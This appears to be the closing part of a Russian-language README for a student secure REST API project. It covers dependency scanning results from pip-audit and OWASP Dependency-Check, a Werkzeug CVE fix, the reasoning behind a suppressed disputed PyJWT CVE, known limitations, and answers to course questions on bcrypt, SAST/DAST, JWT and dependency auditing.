{"dependencies": [{"name": "annotated-types", "version": "0.8.0", "vulns": []},
  {"name": "bcrypt", "version": "5.0.0", "vulns": []},
  ...
  {"name": "pyjwt", "version": "2.15.0", "vulns": []},
  ...
  {"name": "werkzeug", "version": "3.1.9", "vulns": []}], "fixes": []}
```

Лог job pip-audit в том же запуске:

```
No known vulnerabilities found
```

### Найдено и исправлено: CVE-2026-102598 в Werkzeug

pip-audit остановил [запуск CI #20](https://github.com/Goga211/secure-rest-api/actions/runs/38223336152)
(коммит `b133ead`): в зависимостях была уязвимая версия Werkzeug. Остальные три job в этом
запуске прошли, Dependency-Check сборку не остановил. [Лог job pip-audit](https://github.com/Goga211/secure-rest-api/actions/runs/38223336152/job/114724682982):

```
Found 1 known vulnerability in 1 package
Name     Version ID              Fix Versions
-------- ------- --------------- ------------
werkzeug 3.1.8   CVE-2026-102598 3.1.9
##[error]Process completed with exit code 1.
```

Исправление: в `requirements.txt` Werkzeug поднят до 3.1.9, где уязвимость закрыта (коммит
`c56e8e0`). Тесты на новой версии прошли без изменений кода, и
[запуск CI #21](https://github.com/Goga211/secure-rest-api/actions/runs/38223765166) прошёл
полностью. Так pipeline и должен работать: уязвимость в зависимости
появилась в базе после того, как код был готов, и CI заблокировал сборку до обновления.
Позже зависимости переведены на `requirements.in`, и там закреплена нижняя граница
`Werkzeug>=3.1.9`: при перегенерации lock-файла уязвимая версия вернуться не может.

## Сравнение pip-audit и OWASP Dependency-Check

| | pip-audit | OWASP Dependency-Check |
|---|---|---|
| Источник данных | база уязвимостей PyPI (PyPA Advisory Database), по желанию OSV | NVD (база CVE), сопоставление по идентификаторам CPE |
| Как находит пакет | точное имя и версия пакета PyPI | по имени подбираются CPE: для `PyJWT` их было два, `pyjwt_project:pyjwt` и `jwt_project:jwt`, для `pyjwt` в нижнем регистре только первый |
| Поддержка Python | основная задача инструмента | анализаторы Python экспериментальные, нужен флаг `--enableExperimental` |
| Скорость в CI | около 40 секунд вместе с установкой зависимостей | около 30 секунд, сам анализ несколько секунд: action запускает сканер с `--noupdate` и берёт базу NVD, уже собранную в его Docker-образе, ключ NVD не нужен |
| Ложные срабатывания | мало: база ведётся по пакетам PyPI | больше: CPE совпадают неточно, в NVD попадают оспоренные CVE |
| Результат в этом проекте | 22 пакета, уязвимостей не найдено | 26 зависимостей; CVE-2025-45770 в PyJWT 2.15.0 (CVSS 7.0) находилась, пока пакет был записан как `PyJWT`, подавлена с обоснованием |

**Разбор CVE-2025-45770.** Dependency-Check остановил CI на CVE-2025-45770 («слабое
шифрование» в PyJWT), а pip-audit её не нашёл. CVE оспорена: длину ключа HMAC выбирает
приложение, а не библиотека, поэтому в базах PyPI и OSV её нет. В этом проекте стойкость ключа
обеспечивает случайная генерация: `secrets.token_urlsafe(48)` даёт 48 случайных байт, то есть
384 бита энтропии при минимуме 256 бит для HS256 по RFC 7518. Проверка в `Settings` только
отсекает значения короче 32 символов: от слабого, но длинного секрета вроде `"a" * 32` она
не защищает, поэтому секрет нужно генерировать командой из раздела «Локальный запуск», а не
придумывать. CVE подавлена в `dependency-check-suppressions.xml` с этим обоснованием, остальные находки Dependency-Check по-прежнему останавливают CI.

После перехода на lock-файл uv пишет имена пакетов в нижнем регистре (`pyjwt` вместо
`PyJWT`), и Dependency-Check подбирает для PyJWT только CPE `pyjwt_project:pyjwt`, а
CVE-2025-45770 сопоставлялась через `jwt_project:jwt`. Поэтому теперь она не находится, и
подавление не срабатывает (подавленных 0). Версия PyJWT та же: находка зависела только от
регистра букв в имени пакета, и это наглядный пример неточного сопоставления по CPE. Подавление
оставлено: если CVE снова сопоставится, сборка не упадёт на оспоренной уязвимости.

**Вывод.** Инструменты дополняют друг друга. pip-audit точнее для Python и почти не даёт ложных
срабатываний, Dependency-Check шире по охвату (NVD, другие экосистемы), но требует разбора
находок и подавлений с обоснованием. bandit по коду `app/` (463 строки) нашёл одно ложное
замечание уровня low, разобранное выше.

## Известные ограничения

- **Токены нельзя отозвать до истечения срока.** Нет выхода из системы и чёрного списка
  токенов, украденный токен действует до 15 минут. Смягчение: короткий TTL.
- **SQLite и `create_all` без миграций.** Подходит для учебного проекта; для продакшена нужна
  серверная СУБД и миграции (Alembic).
- **Лимитер хранит счётчики в памяти процесса.** Сбрасывается при перезапуске, не работает
  между несколькими процессами или серверами; за обратным прокси все клиенты получат IP
  прокси, нужен `ProxyFix` и общее хранилище (Redis).
- **Нет HTTPS в самом приложении.** Встроенный сервер Flask только для разработки, в
  продакшене API должен работать за обратным прокси с TLS.
- **Пользователи создаются только через CLI.** Эндпоинта регистрации и смены пароля нет.
- **В lock-файле нет хэшей пакетов.** Версии закреплены, но pip не сверяет хэши при установке,
  поэтому подмену пакета в индексе это не поймает. Включается флагом `--generate-hashes` у
  `uv pip compile`.
- **Подавление CVE-2025-45770 нужно пересматривать** при обновлении PyJWT или изменении статуса
  CVE.
- **Образ внутри Dependency-Check action не закреплён.** Сам action закреплён по SHA, но его
  Dockerfile собирается из `owasp/dependency-check-action:latest`; полностью воспроизводимой
  сборки это не даёт. Из того же образа берётся база NVD (action запускает сканер с
  `--noupdate`), поэтому её свежесть зависит от того, когда был собран образ.

## Ответы на контрольные вопросы

**1. Почему bcrypt лучше SHA-256 для паролей?** SHA-256 сделан быстрым: на GPU это миллиарды
хэшей в секунду, поэтому утёкшую базу можно перебрать по словарю. bcrypt медленный намеренно, и
скорость настраивается числом раундов (здесь 12, то есть 2^12 итераций), а ещё ему нужна память,
что мешает перебору на GPU. Случайная соль хранится в самом хэше, поэтому одинаковые пароли дают
разные хэши, и радужные таблицы не работают. Голый SHA-256 соли не добавляет.

**2. Чем SAST отличается от DAST?** SAST анализирует исходный код без запуска (здесь bandit и
правила `S` в ruff): находит опасные вызовы и захардкоженные секреты рано, прямо в CI, но не
видит конфигурацию и поведение работающего приложения и даёт ложные срабатывания. DAST атакует
запущенное приложение снаружи, как чёрный ящик (например, OWASP ZAP): находит то, что видно
только во время работы (заголовки, обработку сессий, ошибки конфигурации), но не показывает
строку кода с проблемой и требует развёрнутого стенда.

**3. Как работает JWT?** Токен состоит из трёх частей в Base64URL через точку: заголовок
(`{"alg": "HS256", "typ": "JWT"}`), payload с claims (здесь `sub`, `iss`, `iat`, `exp`) и
подпись HMAC-SHA256 от первых двух частей на секрете сервера. Payload не шифруется, его может
прочитать кто угодно, поэтому секретов в нём нет. Сервер заново считает подпись своим
секретом и сравнивает с подписью в токене: если payload изменили, подпись не совпадёт. Затем
проверяет алгоритм (только HS256), срок `exp` и издателя `iss`. Состояние на сервере не
хранится, поэтому отозвать токен до истечения срока нельзя (см. ограничения).

**4. Чем опасно не проверять зависимости?** Большая часть кода приложения это сторонние
библиотеки, и уязвимость в любой из них становится уязвимостью приложения (OWASP A06
Vulnerable and Outdated Components): пример в этом проекте, CVE-2026-102598 в Werkzeug. Без
аудита такие CVE остаются в продакшене месяцами, к тому же можно получить вредоносный или
подменённый пакет (supply chain). Поэтому в CI два SCA-сканера, версии всех зависимостей,
включая транзитивные, закреплены в lock-файле `requirements.txt`, который генерируется из
`requirements.in`, и сборка падает на известной уязвимости.
